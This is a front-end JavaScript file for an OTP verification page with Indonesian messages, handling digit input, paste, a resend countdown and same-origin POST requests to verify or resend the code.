/* ========================= */
/* OTP ELEMENTS */
/* ========================= */

const otpInputs =
document.querySelectorAll(".otp-box");

const otpContainer =
document.querySelector(".otp-container");

const errorBox =
document.querySelector(".error-box");

const loadingBox =
document.getElementById("loadingBox");

const alertTitle =
document.querySelector(".alert-title");

const alertDesc =
document.querySelector(".alert-desc");

const phoneNumber =
document.querySelector(".phone-number");

const resendBtn =
document.querySelector(".resend-btn");

const timerText =
document.querySelector(".timer");


/* ========================= */
/* VARIABLES */
/* ========================= */

let alertTimer = null;
let countdown = null;

let time = 60;
let isProcessing = false;


/* ========================= */
/* TEMPORARY ALERT */
/* ========================= */

function showTempAlert(
    title,
    description,
    color = "blue"
) {

    if (
        !errorBox ||
        !alertTitle ||
        !alertDesc
    ) {
        return;
    }

    clearTimeout(alertTimer);

    alertTitle.textContent = title;
    alertDesc.textContent = description;
    alertTitle.style.color = color;

    errorBox.style.display = "block";

    requestAnimationFrame(() => {
        errorBox.classList.add("show");
    });

    alertTimer = setTimeout(() => {

        errorBox.classList.remove("show");

        setTimeout(() => {
            errorBox.style.display = "none";
        }, 300);

    }, 3000);
}


/* ========================= */
/* HIDE ALERT */
/* ========================= */

function hideAlert() {

    if (!errorBox) {
        return;
    }

    clearTimeout(alertTimer);

    errorBox.classList.remove("show");
    errorBox.style.display = "none";
}


/* ========================= */
/* LOADING */
/* ========================= */

function showLoading() {

    if (loadingBox) {
        loadingBox.style.display = "flex";
    }
}


function hideLoading() {

    if (loadingBox) {
        loadingBox.style.display = "none";
    }
}


/* ========================= */
/* RESET OTP */
/* ========================= */

function resetOTP() {

    otpInputs.forEach(input => {
        input.value = "";
        input.disabled = false;
    });

    if (otpInputs.length > 0) {
        otpInputs[0].focus();
    }
}


/* ========================= */
/* DISABLE OTP */
/* ========================= */

function disableOTP() {

    otpInputs.forEach(input => {
        input.disabled = true;
    });
}


/* ========================= */
/* GET OTP VALUE */
/* ========================= */

function getOTPValue() {

    let otp = "";

    otpInputs.forEach(input => {
        otp += input.value;
    });

    return otp;
}


/* ========================= */
/* SHAKE OTP */
/* ========================= */

function shakeOTP() {

    if (!otpContainer) {
        return;
    }

    otpContainer.classList.remove("shake");

    void otpContainer.offsetWidth;

    otpContainer.classList.add("shake");

    if ("vibrate" in navigator) {
        navigator.vibrate(200);
    }

    setTimeout(() => {
        otpContainer.classList.remove("shake");
    }, 350);
}


/* ========================= */
/* FADE IN */
/* ========================= */

window.addEventListener("load", () => {

    document.body.classList.add("fade-in");

});


/* ========================= */
/* RESET WHEN PAGE RETURNS */
/* ========================= */

window.addEventListener("pageshow", () => {

    isProcessing = false;

    hideLoading();
    hideAlert();

    otpInputs.forEach(input => {
        input.disabled = false;
    });

});


/* ========================= */
/* PHONE NUMBER */
/* ========================= */

const savedNumber =
localStorage.getItem("nmrx");

if (savedNumber && phoneNumber) {
    phoneNumber.textContent = savedNumber;
}


/* ========================= */
/* INITIAL STATE */
/* ========================= */

hideLoading();
hideAlert();


/* ========================= */
/* FOCUS OTP CONTAINER */
/* ========================= */

if (otpContainer) {

    otpContainer.addEventListener("click", () => {

        if (isProcessing) {
            return;
        }

        for (
            let index = 0;
            index < otpInputs.length;
            index++
        ) {

            if (otpInputs[index].value === "") {

                otpInputs[index].focus();
                return;

            }
        }

        if (otpInputs.length > 0) {
            otpInputs[otpInputs.length - 1].focus();
        }

    });

}


/* ========================= */
/* OTP INPUT HANDLING */
/* ========================= */

otpInputs.forEach((input, index) => {

    input.setAttribute("inputmode", "numeric");
    input.setAttribute("autocomplete", "one-time-code");
    input.setAttribute("maxlength", "1");

    input.addEventListener("input", () => {

        if (isProcessing) {
            return;
        }

        input.value =
        input.value
        .replace(/\D/g, "")
        .slice(0, 1);

        hideAlert();

        if (
            input.value.length === 1 &&
            index < otpInputs.length - 1
        ) {

            otpInputs[index + 1].focus();

        }

        checkOTP();

    });


    input.addEventListener("keydown", event => {

        if (isProcessing) {
            return;
        }

        if (
            event.key === "Backspace" &&
            input.value === "" &&
            index > 0
        ) {

            otpInputs[index - 1].focus();

        }

        if (
            event.key === "ArrowLeft" &&
            index > 0
        ) {

            otpInputs[index - 1].focus();

        }

        if (
            event.key === "ArrowRight" &&
            index < otpInputs.length - 1
        ) {

            otpInputs[index + 1].focus();

        }

    });


    input.addEventListener("paste", event => {

        event.preventDefault();

        if (isProcessing) {
            return;
        }

        const pastedText =
        event.clipboardData
        .getData("text")
        .replace(/\D/g, "")
        .slice(0, otpInputs.length);

        if (!pastedText) {
            return;
        }

        otpInputs.forEach((otpInput, otpIndex) => {

            otpInput.value =
            pastedText[otpIndex] || "";

        });

        const nextEmptyIndex =
        [...otpInputs].findIndex(
            otpInput => otpInput.value === ""
        );

        if (nextEmptyIndex >= 0) {
            otpInputs[nextEmptyIndex].focus();
        } else {
            otpInputs[otpInputs.length - 1].focus();
        }

        checkOTP();

    });

});


/* ========================= */
/* CHECK AND VERIFY OTP */
/* ========================= */

async function checkOTP() {

    const otp = getOTPValue();

    if (
        otp.length !== otpInputs.length ||
        isProcessing
    ) {
        return;
    }

    isProcessing = true;

    disableOTP();
    showLoading();
    hideAlert();

    try {

        const response = await fetch(
            "/verify-otp",
            {
                method: "POST",

                headers: {
                    "Content-Type":
                    "application/json"
                },

                credentials: "same-origin",

                body: JSON.stringify({
                    otp
                })
            }
        );

        let data = {};

        try {
            data = await response.json();
        } catch {
            data = {};
        }

        if (!response.ok) {

            throw new Error(
                data.message ||
                "Kode verifikasi tidak dapat diproses."
            );

        }

        if (data.success === true) {

            showTempAlert(
                "Berhasil",
                data.message ||
                "Kode berhasil diverifikasi.",
                "green"
            );

            if (data.redirectUrl) {

                setTimeout(() => {
                    window.location.href =
                    data.redirectUrl;
                }, 700);

            }

            return;
        }

        throw new Error(
            data.message ||
            "Kode verifikasi tidak valid."
        );

    } catch (error) {

        console.error(
            "OTP verification error:",
            error
        );

        shakeOTP();

        showTempAlert(
            "Verifikasi Gagal",
            error.message ||
            "Terjadi kesalahan. Silakan coba lagi.",
            "red"
        );

        resetOTP();

    } finally {

        hideLoading();

        if (
            !document.hidden &&
            !window.location.href.includes(
                "redirect"
            )
        ) {

            isProcessing = false;

            otpInputs.forEach(input => {
                input.disabled = false;
            });

        }

    }

}


/* ========================= */
/* RESEND TIMER */
/* ========================= */

function startResendTimer() {

    if (!resendBtn || !timerText) {
        return;
    }

    clearInterval(countdown);

    time = 60;

    resendBtn.disabled = true;
    resendBtn.classList.remove("active");

    timerText.textContent = "01:00";

    countdown = setInterval(() => {

        time--;

        const minutes =
        String(
            Math.floor(time / 60)
        ).padStart(2, "0");

        const seconds =
        String(time % 60)
        .padStart(2, "0");

        timerText.textContent =
        `${minutes}:${seconds}`;

        if (time <= 0) {

            clearInterval(countdown);

            timerText.textContent = "00:00";

            resendBtn.disabled = false;
            resendBtn.classList.add("active");

        }

    }, 1000);

}


/* ========================= */
/* RESEND OTP */
/* ========================= */

if (resendBtn) {

    resendBtn.addEventListener(
        "click",
        async () => {

            if (
                resendBtn.disabled ||
                isProcessing
            ) {
                return;
            }

            resendBtn.disabled = true;
            resendBtn.classList.remove("active");

            showLoading();
            hideAlert();

            try {

                const response = await fetch(
                    "/resend-otp",
                    {
                        method: "POST",

                        headers: {
                            "Content-Type":
                            "application/json"
                        },

                        credentials: "same-origin"
                    }
                );

                let data = {};

                try {
                    data = await response.json();
                } catch {
                    data = {};
                }

                if (!response.ok) {

                    throw new Error(
                        data.message ||
                        "Kode tidak dapat dikirim ulang."
                    );

                }

                showTempAlert(
                    "Kode Dikirim",
                    data.message ||
                    "Kode verifikasi baru telah dikirim.",
                    "blue"
                );

                resetOTP();
                startResendTimer();

            } catch (error) {

                console.error(
                    "Resend OTP error:",
                    error
                );

                showTempAlert(
                    "Gagal Mengirim",
                    error.message ||
                    "Silakan coba kembali.",
                    "red"
                );

                resendBtn.disabled = false;
                resendBtn.classList.add("active");

            } finally {

                hideLoading();

            }

        }
    );

}


/* START TIMER */
startResendTimer();
